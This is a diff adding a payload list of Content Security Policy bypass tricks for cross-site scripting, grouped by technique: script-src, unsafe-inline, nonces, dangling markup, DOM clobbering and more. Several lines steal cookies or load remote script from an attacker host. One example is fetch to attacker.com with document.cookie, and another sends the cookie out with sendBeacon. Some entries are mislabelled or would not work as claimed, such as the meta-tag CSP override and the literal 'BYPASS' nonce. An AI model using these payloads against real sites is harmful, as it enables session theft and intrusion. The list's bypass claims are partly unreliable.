@@ -1,0 +1,87 @@
+# Content Security Policy (CSP) Bypass Techniques - 2025 Advanced Edition
+
+# script-src bypasses
+# Using data: protocol to bypass script-src restrictions
+<script src="data:application/javascript,alert(1)"></script>
+# Using base64 encoded data: protocol to bypass script-src restrictions
+<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
+# Using object tag to bypass script-src restrictions
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+# Using link rel=import to bypass script-src restrictions
+<link rel=import href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+# Using iframe srcdoc to bypass script-src restrictions
+<iframe srcdoc="<script>alert(document.domain)</script>"></iframe>
+
+# unsafe-inline bypasses
+# Using img tag with onerror attribute to bypass unsafe-inline restrictions
+<img src=x onerror="eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))">
+# Using svg tag with script tag to bypass unsafe-inline restrictions
+<svg><script>alert(document.domain)</script></svg>
+# Using svg tag with animate tag to bypass unsafe-inline restrictions
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<svg><animate attributeName=x dur=1s onbegin=alert(1)>
+<svg><animate attributeName=x dur=1s onend=alert(1)>
+<svg><set attributeName=x dur=1s onbegin=alert(1)>
+<svg><set attributeName=x dur=1s onend=alert(1)>
+
+# nonce/hash bypasses
+# Using nonce attribute to bypass nonce/hash restrictions
+<script nonce=BYPASS>alert(1)</script>
+# Using stolen nonce to bypass nonce/hash restrictions
+<script nonce=STOLEN_NONCE>alert(1)</script>
+# Using setTimeout function to bypass nonce/hash restrictions
+<script>setTimeout('alert(1)')</script>
+# Using setTimeout function with base64 encoded data to bypass nonce/hash restrictions
+<script>setTimeout(atob('YWxlcnQoMSk='))</script>
+# Using eval function with base64 encoded data to bypass nonce/hash restrictions
+<script>eval(atob('YWxlcnQoMSk='))</script>
+
+# Dangling markup injection
+# Using img tag with src attribute to inject malicious code
+<img src='https://attacker.com/?
+# Using script tag to inject malicious code
+<script>fetch('https://attacker.com/?cookie='+document.cookie)</script>
+# Using script tag with src attribute to inject malicious code
+<script src="https://attacker.com/xss.js"></script>
+
+# JSONP/CORS bypasses
+# Using script tag with src attribute to bypass JSONP/CORS restrictions
+<script src="https://trusted-cdn.com/jsonp?callback=alert(1)"></script>
+# Using fetch API to bypass JSONP/CORS restrictions
+<script>fetch('https://vulnerable-cors-site.com').then(r=>r.json()).then(data=>alert(JSON.stringify(data)))</script>
+
+# DOM clobbering
+# Using form tag with id and name attributes to clobber DOM
+<form id=alert name=alert><input name=call>
+# Using img tag with name and id attributes to clobber DOM
+<img name=body id=body src=x>
+# Using a tag with id and name attributes to clobber DOM
+<a id=body><a id=body name=innerHTML href=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>
+
+# Prototype pollution
+# Using Object.prototype to pollute prototype chain
+<script>Object.prototype.vulnerable = 'javascript:alert(1)';</script>
+
+# Trusted Types bypasses
+# Using trustedTypes API to bypass Trusted Types restrictions
+<script>trustedTypes.createPolicy('bypass', {createHTML: s => s}).createHTML('<img src=x onerror=alert(1)>');</script>
+
+# iframe sandbox bypasses
+# Using iframe tag with sandbox attribute to bypass iframe sandbox restrictions
+<iframe sandbox="allow-scripts allow-same-origin" srcdoc="<script>alert(document.domain)</script>"></iframe>
+
+# Meta tag CSP bypasses
+# Using meta tag with http-equiv attribute to bypass CSP restrictions
+<meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-inline'">
+# Using script tag to inject malicious code
+<script>alert(1)</script>
+
+# report-uri exploitation
+# Using img tag with onerror attribute to exploit report-uri
+<img src=x onerror="navigator.sendBeacon('/csp-report', document.cookie)">
+
+# frame-ancestors bypass
+# Using iframe tag with src attribute to bypass frame-ancestors restrictions
+<iframe src="javascript:alert(parent.document.domain)"></iframe>
+
+# More advanced payloads in custom_payloads/csp-bypass.txt
